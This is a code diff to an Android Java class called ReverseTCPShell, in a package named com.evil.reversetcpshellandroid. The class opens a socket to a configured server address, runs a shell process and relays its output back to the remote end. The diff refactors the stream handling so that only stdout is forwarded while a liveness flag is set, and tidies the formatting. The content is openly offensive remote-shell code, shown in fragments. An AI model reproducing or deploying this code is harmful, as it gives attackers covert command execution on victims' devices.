@@ -1,7 +1,8 @@
+package com.evil.reversetcpshellandroid.library;
+
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.Message;
-import android.text.TextUtils;
 import android.util.Log;
 
 import java.io.BufferedReader;
@@ -62,7 +63,6 @@ public class ReverseTCPShell {
 
     private PrintWriter commandWriter;
     private BufferedReader commandReader;
-    private BufferedReader errorReader;
 
     private ReverseTCPShell() {
         super();
@@ -108,7 +108,7 @@ public class ReverseTCPShell {
 
 
     private void connect() {
-        new Thread(){
+        new Thread() {
             @Override
             public void run() {
                 Log.d(TAG, "尝试连接服务器:" + ip + ":" + port);
@@ -133,8 +133,8 @@ public class ReverseTCPShell {
         }.start();
     }
 
-    private void startFeedBackThread(){
-        feedBackThread = new HandlerThread("feedback"){
+    private void startFeedBackThread() {
+        feedBackThread = new HandlerThread("feedback") {
             @Override
             public void run() {
                 try {
@@ -143,22 +143,18 @@ public class ReverseTCPShell {
 
                     InputStream IS = p.getInputStream();
                     OutputStream OS = p.getOutputStream();
-                    InputStream ES = p.getErrorStream();
                     commandWriter = new PrintWriter(OS);
                     commandReader = new BufferedReader(new InputStreamReader(IS));
-                    errorReader = new BufferedReader(new InputStreamReader(ES));
 
-                    String line, error = null;
-                    while ((line = commandReader.readLine()) != null || (error = errorReader.readLine()) != null) {
+                    String line = "";
+                    while ((line = commandReader.readLine()) != null && alive) {
                         socketWriter.println(line);
-                        socketWriter.println(error);
                         socketWriter.flush();
                         Message msg = Message.obtain();
                         msg.what = FEEDBACK;
-                        msg.obj = line + error;
+                        msg.obj = line;
                         handler.sendMessage(msg);
                     }
-
                     p.destroy();
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -171,7 +167,7 @@ public class ReverseTCPShell {
     }
 
     public void startReceiveThread() {
-        receiveThread = new HandlerThread("receive"){
+        receiveThread = new HandlerThread("receive") {
             @Override
             public void run() {
                 String receive;
@@ -188,7 +184,7 @@ public class ReverseTCPShell {
                     }
                 } catch (IOException e) {
                     e.printStackTrace();
-                }finally {
+                } finally {
                     connectStopped();
                 }
             }
@@ -197,7 +193,7 @@ public class ReverseTCPShell {
     }
 
 
-    private void connectStopped(){
+    private void connectStopped() {
         try {
             socket.close();
         } catch (IOException e) {
@@ -209,7 +205,7 @@ public class ReverseTCPShell {
     }
 
 
-    synchronized public void stop(){
+    synchronized public void stop() {
         connectStopped();
         handler.removeMessages(RECEIVE);
         handler.removeMessages(FEEDBACK);
